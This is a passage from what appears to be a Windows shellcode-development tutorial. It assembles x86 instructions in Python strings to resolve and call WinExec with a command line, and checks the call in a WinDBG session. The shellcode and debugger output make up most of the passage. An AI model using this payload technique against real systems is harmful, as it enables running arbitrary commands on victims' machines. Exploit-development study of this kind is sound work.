    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x28], eax           ;"  #   Save WinExec address for later usage**
```

With the function resolved we need to add the call to `WinExec`. We want to display the window so we set the `uCMDShow` parameter to 1 e.g. `SW_SHOWNORMAL`**.**

```python
		" call_winexec:            "   #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    #   Prepare parameters for call_winexec
    "   xor eax, eax                    ;"  #   Push uCmdShow onto stack
    "   inc eax                         ;"  #   Push uCmdShow onto stack
    "   push eax                        ;"  #   Push uCmdShow onto stack
		"   lea edx, [ebp+0x90]             ;"  #   szFileName appended path e.g. lpCmdLine
    "   push edx                        ;"  #   Push lpCmdLine onto stac
    **"   call dword ptr [ebp+0x28]      ;"  #   Call call_winexec**
```

Let’s test in WinDBG to ensure the function is called and the parameters is setup as expected.

```python
0:003> dds esp L2
0335f10c  0335fdec
0335f110  00000001

0:003> p
eax=00000001 ebx=757c0000 ecx=35a57ae2 edx=0374f984 esi=0336002f edi=014823e8
eip=03360173 esp=0374eca4 ebp=0374f8f4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
03360173 ff5528          call    dword ptr [ebp+28h]  ss:0023:0374f91c={KERNEL32!WinExec (75334020)}
```